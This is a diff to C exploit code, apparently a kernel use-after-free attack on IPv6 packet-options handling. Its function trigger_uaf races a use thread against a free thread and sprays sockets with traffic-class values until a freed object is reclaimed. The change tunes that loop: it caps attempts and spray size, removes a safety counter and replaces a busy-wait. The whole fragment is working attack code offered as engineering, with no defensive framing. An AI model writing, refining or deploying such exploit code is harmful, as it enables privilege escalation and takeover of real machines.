@@ -186,28 +186,30 @@ void trigger_uaf(struct opaque* o) {
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
 
-    int safety_counter = 0;
+    int attempts = 0;
+    const int MAX_SPRAY = 32;
 
-    while (1) {
-        for (int i = 0; i < SPRAY_SIZE; i++)
-            set_tclass(o->spray_sock[i], TCLASS_SPRAY);
+    while (attempts++ < 1000) {
+        for (int i = 0; i < MAX_SPRAY; i++) {
+            if (set_tclass(o->spray_sock[i], TCLASS_SPRAY))
+                reset_ipv6_opts(o->spray_sock[i]);
+        }
 
         if (get_tclass(o->master_sock) == TCLASS_SPRAY)
             break;
 
-        for (int i = 0; i < SPRAY_SIZE; i++)
+        for (int i = 0; i < MAX_SPRAY; i++) {
             free_pktopts(o->spray_sock[i]);
+        }
 
         nanosleep(NANOSLEEP_100US, NULL);
-
-        if (safety_counter++ > 50000) {
-            o->triggered = 1;
-            break;
-        }
     }
 
     o->triggered = 1;
-    while (!o->done1 || !o->done2);
+
+   for (int wait = 0; wait < 100 && (!o->done1 || !o->done2); wait++) {
+        nanosleep(NANOSLEEP_100US, NULL);
+    }
 }
 
 int build_rthdr_msg(char* buf, int size) {
